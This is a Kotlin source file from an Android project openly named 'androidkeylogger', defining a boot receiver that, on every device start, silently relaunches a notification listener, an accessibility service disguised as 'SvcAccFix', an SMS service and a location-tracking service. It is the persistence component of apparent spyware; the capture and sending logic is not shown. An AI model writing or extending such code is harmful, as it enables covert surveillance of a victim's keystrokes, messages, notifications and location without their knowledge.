package com.azamovhudstc.androidkeylogger.receiver

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import com.azamovhudstc.androidkeylogger.service.LocationService
import com.azamovhudstc.androidkeylogger.service.MyNotificationListenerService
import com.azamovhudstc.androidkeylogger.service.SmsService
import com.azamovhudstc.androidkeylogger.service.SvcAccFix

class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // MyNotificationListenerService-ni boshlash
            val notificationServiceIntent =
                Intent(context, MyNotificationListenerService::class.java)
            context.startService(notificationServiceIntent)

            val accessibilityServiceIntent = Intent(context, SvcAccFix::class.java)
            context.startService(accessibilityServiceIntent)

            val smsServiceIntent = Intent(context, SmsService::class.java)
            context.startService(smsServiceIntent)
            checkLocationPermission(context)

            val serviceIntent = Intent(context, LocationService::class.java)
            context.startForegroundService(serviceIntent)



        }
    }
    private fun checkLocationPermission(context: Context?) {
        val permission = Manifest.permission.ACCESS_FINE_LOCATION
        val permissionStatus = ContextCompat.checkSelfPermission(context!!, permission)
        if (permissionStatus == PackageManager.PERMISSION_GRANTED) {
            // Permission berilgan, location bilan bog'liq operatsiyalarni boshlash mumkin
            val locationService = Intent(context, LocationService::class.java)
            context.startService(locationService)
        } else {
            // Permission so'rash kerak
            // Permission so'ralishi uchun ushbu joyda dialog yoki bildirish chiqarish mumkin
        }
    }
}
